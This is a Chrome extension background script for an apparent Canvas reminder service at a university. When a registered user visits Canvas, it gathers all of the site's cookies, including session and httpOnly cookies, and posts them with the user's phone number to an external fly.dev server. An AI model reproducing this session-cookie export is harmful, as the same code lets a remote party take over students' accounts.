const API_URL = "https://canvas-reminder-auc.fly.dev";
const CANVAS_URL = "https://aucegypt.instructure.com";

// Listen for when user navigates to Canvas dashboard (means they're logged in)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.startsWith(CANVAS_URL)) {
    // User is on Canvas — check if they have a pending registration
    chrome.storage.local.get(["phone", "name"], (data) => {
      if (data.phone) {
        grabAndSendCookies(data.phone, data.name || "");
      }
    });
  }
});

async function grabAndSendCookies(phone, name) {
  try {
    const cookies = await chrome.cookies.getAll({ domain: "aucegypt.instructure.com" });
    if (!cookies || cookies.length === 0) return;

    // Check if we have a valid session cookie
    const hasSession = cookies.some(c => c.name === "canvas_session" || c.name === "log_session_id");
    if (!hasSession) return;

    const cookieList = cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      httpOnly: c.httpOnly,
      secure: c.secure,
      sameSite: c.sameSite === "unspecified" ? "Lax" : c.sameSite,
    }));

    const resp = await fetch(`${API_URL}/api/register-cookies`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, name, cookies: cookieList }),
    });

    const result = await resp.json();
    if (result.success) {
      // Clear stored data and notify user
      chrome.storage.local.remove(["phone", "name"]);
      chrome.action.setBadgeText({ text: "✓" });
      chrome.action.setBadgeBackgroundColor({ color: "#22c55e" });
    }
  } catch (err) {
    console.error("Failed to send cookies:", err);
  }
}
